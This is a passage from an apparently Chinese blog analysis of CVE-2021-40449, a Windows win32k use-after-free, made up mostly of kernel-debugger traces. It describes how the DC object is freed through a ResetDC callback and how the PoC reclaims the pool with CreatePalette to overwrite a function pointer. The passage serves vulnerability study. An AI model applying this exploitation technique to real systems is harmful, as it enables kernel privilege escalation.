&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#f92672">:&lt;/span> kd&lt;span style="color:#f92672">&amp;gt;&lt;/span> dq ffffd50e&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">00052030&lt;/span>&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#ae81ff">0xad0&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ffffd50e&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">00052&lt;/span>b00 ffffd548&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>a1f10c30 ffffd548&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>a1db18c0
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ffffd50e&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">00052&lt;/span>b10 &lt;span style="color:#ae81ff">00000000&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">00000000&lt;/span> &lt;span style="color:#ae81ff">00000000&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">00000000&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ffffd50e&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">00052&lt;/span>b20 &lt;span style="color:#ae81ff">00000000&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">00000000&lt;/span> ffffd548&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>a1f10930
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ffffd50e&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">00052&lt;/span>b30 &lt;span style="color:#ae81ff">00000000&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">00000000&lt;/span> ffffd548&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>a1f11dc0
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ffffd50e&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">00052&lt;/span>b40 ffffd548&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>a1f0e6b0 ffffd548&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>a1f11b00
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ffffd50e&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">00052&lt;/span>b50 &lt;span style="color:#ae81ff">00000000&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">00000000&lt;/span> ffffd548&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>a1f0cd70
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ffffd50e&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">00052&lt;/span>b60 ffffd548&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>a1f0d1f0 ffffd548&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>a1f112f0
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ffffd50e&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">00052&lt;/span>b70 &lt;span style="color:#ae81ff">00000000&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">00000000&lt;/span> &lt;span style="color:#ae81ff">00000000&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">00000000&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// 以下为函数的汇编
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#f92672">:&lt;/span> kd&lt;span style="color:#f92672">&amp;gt;&lt;/span> u ffffd548&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>a1f10c30
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>win32kfull&lt;span style="color:#f92672">!&lt;/span>UMPDDrvResetPDEV:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ffffd548&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>a1f10c30 &lt;span style="color:#ae81ff">48895&lt;/span>c2418 mov qword ptr [rsp&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#ae81ff">18&lt;/span>h],rbx
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ffffd548&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>a1f10c35 &lt;span style="color:#ae81ff">4889742420&lt;/span> mov qword ptr [rsp&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#ae81ff">20&lt;/span>h],rsi
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ffffd548&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>a1f10c3a &lt;span style="color:#ae81ff">57&lt;/span> push rdi
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ffffd548&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>a1f10c3b &lt;span style="color:#ae81ff">4883&lt;/span>ec70 sub rsp,&lt;span style="color:#ae81ff">70&lt;/span>h
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ffffd548&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>a1f10c3f &lt;span style="color:#ae81ff">488&lt;/span>b05ba440800 mov rax,qword ptr [win32kfull&lt;span style="color:#f92672">!&lt;/span>&lt;span style="color:#a6e22e">_security_cookie&lt;/span> (ffffd548&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>a1f95100)]
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ffffd548&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>a1f10c46 &lt;span style="color:#ae81ff">4833&lt;/span>c4 xor rax,rsp
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ffffd548&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>a1f10c49 &lt;span style="color:#ae81ff">4889442468&lt;/span> mov qword ptr [rsp&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#ae81ff">68&lt;/span>h],rax
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ffffd548&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>a1f10c4e &lt;span style="color:#ae81ff">488&lt;/span>bf9 mov rdi,rcx
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>之后通过hdcOpenDCW函数调用用户模式的回调函数，在回调函数中再次调用ResetDC函数，此时传入的HDC和第一次调用ResetDC的是同一个句柄。&lt;/p>
&lt;p>
&lt;img alt="image-20211110161002502" src="https://www.ch35tnut.site/images/vulnerability/CVE-2021-40449-analyse.assets/image-20211110161002502.png" />&lt;/p>
&lt;p>第二次调用&lt;code>win32kfull!GreResetDCInternal&lt;/code> 时，传入同一个HDC句柄，即对应同一个DC对象。&lt;/p>
&lt;pre tabindex="0">&lt;code>0: kd&amp;gt; t
win32kfull!GreResetDCInternal:
ffffd548`a1f03e58 488bc4 mov rax,rsp
1: kd&amp;gt; rrcx
rcx=00000000092105f1
&lt;/code>&lt;/pre>&lt;p>第二次调用DCOBJ构造函数时，由于传入的是同一个HDC句柄，所以HDC句柄引用次数+1，同时两次调用构造函数构造的对象关联到同一个DC对象。&lt;/p>
&lt;p>
&lt;img alt="image-20211110162021866" src="https://www.ch35tnut.site/images/vulnerability/CVE-2021-40449-analyse.assets/image-20211110162021866.png" />&lt;/p>
&lt;p>
&lt;img alt="" src="https://www.ch35tnut.site/images/vulnerability/CVE-2021-40449-analyse.assets/%E4%B8%A4%E4%B8%AA%E5%AF%B9%E8%B1%A1%E5%85%B3%E7%B3%BB%E5%9B%BE.jpg" />&lt;/p>
&lt;p>之后第二次调用win32kfull!_imp_hdcOpenDCW函数，在该函数内执行政策回调函数，win32kfull!imp_hdcOpenDCW返回一个HDC句柄值为&lt;code>0000000003210041&lt;/code>，即创建了一个新的DC对象。之后通过新创建的DC对象创建DCO对象。&lt;/p>
&lt;p>
&lt;img alt="image-20211110163914337" src="https://www.ch35tnut.site/images/vulnerability/CVE-2021-40449-analyse.assets/image-20211110163914337.png" />&lt;/p>
&lt;p>在win32kfull!GreResetDCInternal后半段会调用win32kfull!_imp_HmgSwapLockedHandleContents交换第一个HDC句柄和第二次调用win32kfull!imp_hdcOpenDCW创建的HDC句柄。&lt;/p>
&lt;p>
&lt;img alt="image-20211110164604391" src="https://www.ch35tnut.site/images/vulnerability/CVE-2021-40449-analyse.assets/image-20211110164604391.png" />&lt;/p>
&lt;p>调用win32kfull!_imp_HmgSwapLockedHandleContents之后两个句柄对应的DC内容为已经发生了交换&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-c" data-lang="c">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// 以下内容为旧DC对象，但是句柄为新句柄
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#f92672">:&lt;/span> kd&lt;span style="color:#f92672">&amp;gt;&lt;/span> dq ffffd50e041fd010
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ffffd50e&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">041f&lt;/span>d010 &lt;span style="color:#ae81ff">00000000&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">03210041&lt;/span> &lt;span style="color:#ae81ff">80000001&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">00000000&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>......
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#f92672">:&lt;/span> kd&lt;span style="color:#f92672">&amp;gt;&lt;/span> dq ffffd50e03fee010
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// 以下内容为新DC对象，但句柄为旧句柄
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>ffffd50e&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">03f&lt;/span>ee010 &lt;span style="color:#ae81ff">00000000&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">092105f&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span> &lt;span style="color:#ae81ff">80000002&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">00000000&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>......
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>之后调用win32kfull!_imp_bDeleteDCInternal传入HDC句柄，该函数会释放HDC句柄对应的DC对象，而此时传入该函数的HDC句柄为第二次调用hdcOpenDCW函数返回的句柄，但之前交换过新旧句柄，所以实际上释放的是旧HDC句柄对应的DC对象。&lt;/p>
&lt;p>
&lt;img alt="image-20211110164912079" src="https://www.ch35tnut.site/images/vulnerability/CVE-2021-40449-analyse.assets/image-20211110164912079.png" />&lt;/p>
&lt;p>之前计算函数指针的时候，我们知道DCO +0x30是指向DC对象的指针，所以在调用win32kfull!_imp_bDeleteDCInternal函数之后，原DC对象的内存空间已经被释放，达成了use-after-free的第一步free。&lt;/p>
&lt;blockquote>
&lt;p>function pointer=* (* (DCO +0x30)+0xad0)，其中DCO +0x30即指向DC对象的指针&lt;/p>
&lt;/blockquote>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-c" data-lang="c">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#f92672">:&lt;/span> kd&lt;span style="color:#f92672">&amp;gt;&lt;/span> dq ffffd50e041fd010&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#ae81ff">0x30&lt;/span> &lt;span style="color:#75715e">// 取DC对象地址
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>ffffd50e&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">041f&lt;/span>d040 ffffd50e&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">00052030&lt;/span> &lt;span style="color:#ae81ff">00000000&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">00000000&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>......
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#f92672">:&lt;/span> kd&lt;span style="color:#f92672">&amp;gt;&lt;/span> &lt;span style="color:#f92672">!&lt;/span>pool ffffd50e&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">00052030&lt;/span> &lt;span style="color:#75715e">// DC对象的内存已被释放，大小为e30
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>Pool page ffffd50e00052030 region is Paged session pool
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">*&lt;/span>ffffd50e00052000 size: e30 previous size: &lt;span style="color:#ae81ff">0&lt;/span> (Free ) &lt;span style="color:#f92672">*&lt;/span>GDev
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Pooltag GDev : Gdi pdev
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ffffd50e00052e30 size: &lt;span style="color:#ae81ff">10&lt;/span> previous size: &lt;span style="color:#a6e22e">e30&lt;/span> (Free) Free
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ffffd50e00052e40 size: &lt;span style="color:#ae81ff">1&lt;/span>c0 previous size: &lt;span style="color:#ae81ff">10&lt;/span> (Allocated) Usqu
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>之后只需要申请这块内存空间并构造，刚删除的时候，虽然DC对象已经被释放，但函数指针还是指向正确的函数地址，接下来就要申请空间，覆盖这块内存空间的函数指针的值即可。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-c" data-lang="c">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#f92672">:&lt;/span> kd&lt;span style="color:#f92672">&amp;gt;&lt;/span> dq ffffd50e041fd010&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#ae81ff">0x30&lt;/span> &lt;span style="color:#75715e">// 取DC对象地址
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>ffffd50e&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">041f&lt;/span>d040 ffffd50e&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">00052030&lt;/span> &lt;span style="color:#ae81ff">00000000&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">00000000&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#f92672">:&lt;/span> kd&lt;span style="color:#f92672">&amp;gt;&lt;/span> dq ffffd50e&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">00052030&lt;/span>&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#ae81ff">0xad0&lt;/span> &lt;span style="color:#75715e">// 取DC对象内的函数指针
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>ffffd50e&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">00052&lt;/span>b00 ffffd548&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>a1f10c30 ffffd548&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>a1db18c0
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#f92672">:&lt;/span> kd&lt;span style="color:#f92672">&amp;gt;&lt;/span> u ffffd548&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>a1f10c30
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>win32kfull&lt;span style="color:#f92672">!&lt;/span>UMPDDrvResetPDEV:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ffffd548&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>a1f10c30 &lt;span style="color:#ae81ff">48895&lt;/span>c2418 mov qword ptr [rsp&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#ae81ff">18&lt;/span>h],rbx
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ffffd548&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>a1f10c35 &lt;span style="color:#ae81ff">4889742420&lt;/span> mov qword ptr [rsp&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#ae81ff">20&lt;/span>h],rsi
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ffffd548&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>a1f10c3a &lt;span style="color:#ae81ff">57&lt;/span> push rdi
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ffffd548&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>a1f10c3b &lt;span style="color:#ae81ff">4883&lt;/span>ec70 sub rsp,&lt;span style="color:#ae81ff">70&lt;/span>h
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ffffd548&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>a1f10c3f &lt;span style="color:#ae81ff">488&lt;/span>b05ba440800 mov rax,qword ptr [win32kfull&lt;span style="color:#f92672">!&lt;/span>&lt;span style="color:#a6e22e">_security_cookie&lt;/span> (ffffd548&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>a1f95100)]
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ffffd548&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>a1f10c46 &lt;span style="color:#ae81ff">4833&lt;/span>c4 xor rax,rsp
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ffffd548&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>a1f10c49 &lt;span style="color:#ae81ff">4889442468&lt;/span> mov qword ptr [rsp&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#ae81ff">68&lt;/span>h],rax
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ffffd548&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>a1f10c4e &lt;span style="color:#ae81ff">488&lt;/span>bf9 mov rdi,rcx
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h4 id="use-部分">use 部分&lt;/h4>
&lt;p>注：此部分为第二次调试，所以句柄、内存地址和前部分不一样。&lt;/p>
&lt;p>在poc里面会调用CreatePalette函数，该此函数会申请内核堆，&lt;/p>
&lt;p>第一个句柄&lt;code>rcx=0000000015213372&lt;/code>&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-c" data-lang="c">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// 第一个DCO对象
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#f92672">:&lt;/span> kd&lt;span style="color:#f92672">&amp;gt;&lt;/span> dq rbx
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>DBGHELP: SharedUserData &lt;span style="color:#f92672">-&lt;/span> virtual symbol module
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ffff885e&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">847&lt;/span>d2620 &lt;span style="color:#ae81ff">00000000&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">15213372&lt;/span> &lt;span style="color:#ae81ff">80000001&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">00000000&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>......
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// 第一个PDC 指向DC对象
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#f92672">:&lt;/span> kd&lt;span style="color:#f92672">&amp;gt;&lt;/span> dq ffff885e&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">847&lt;/span>d2620&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#ae81ff">0x30&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ffff885e&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">847&lt;/span>d2650 ffff885e&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">80063030&lt;/span> &lt;span style="color:#ae81ff">00000000&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">00000000&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>......
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// 第一个DC对象
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#f92672">:&lt;/span> kd&lt;span style="color:#f92672">&amp;gt;&lt;/span> dq ffff885e&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">80063030&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ffff885e&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">80063030&lt;/span> &lt;span style="color:#ae81ff">00000000&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">00000000&lt;/span> &lt;span style="color:#ae81ff">00000000&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">00000000&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ffff885e&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">80063040&lt;/span> &lt;span style="color:#ae81ff">00000000&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">00000000&lt;/span> ffff885e&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">80046010&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ffff885e&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">80063050&lt;/span> &lt;span style="color:#ae81ff">00000001&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">00000001&lt;/span> ffff885e&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">80063030&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ffff885e&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">80063060&lt;/span> &lt;span style="color:#ae81ff">00000000&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">00000000&lt;/span> &lt;span style="color:#ae81ff">00000000&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">0000&lt;/span>&lt;span style="color:#ae81ff">8180&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ffff885e&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">80063070&lt;/span> ffffb48d&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>a36b4e50 &lt;span style="color:#ae81ff">00000000&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">00000000&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ffff885e&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">80063080&lt;/span> &lt;span style="color:#ae81ff">00000000&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">00000000&lt;/span> &lt;span style="color:#ae81ff">00000000&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">00000000&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ffff885e&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">80063090&lt;/span> &lt;span style="color:#ae81ff">00000000&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">00000000&lt;/span> &lt;span style="color:#ae81ff">00000000&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">00000000&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ffff885e&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">800630&lt;/span>a0 &lt;span style="color:#ae81ff">00000000&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">00000000&lt;/span> &lt;span style="color:#ae81ff">00000000&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">00000000&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>第二个句柄&lt;code>rax=0000000001211b60&lt;/code>&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-c" data-lang="c">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#f92672">:&lt;/span> kd&lt;span style="color:#f92672">&amp;gt;&lt;/span> dq rdx
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>DBGHELP: SharedUserData &lt;span style="color:#f92672">-&lt;/span> virtual symbol module
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ffff885e&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">84121620&lt;/span> &lt;span style="color:#ae81ff">00000000&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">01211&lt;/span>b60 &lt;span style="color:#ae81ff">80000001&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">00000000&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>......
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#f92672">:&lt;/span> kd&lt;span style="color:#f92672">&amp;gt;&lt;/span> dq rdx&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#ae81ff">0x30&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ffff885e&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">84121650&lt;/span> ffff885e&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">8006&lt;/span>b030 &lt;span style="color:#ae81ff">00000000&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">00000000&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>......
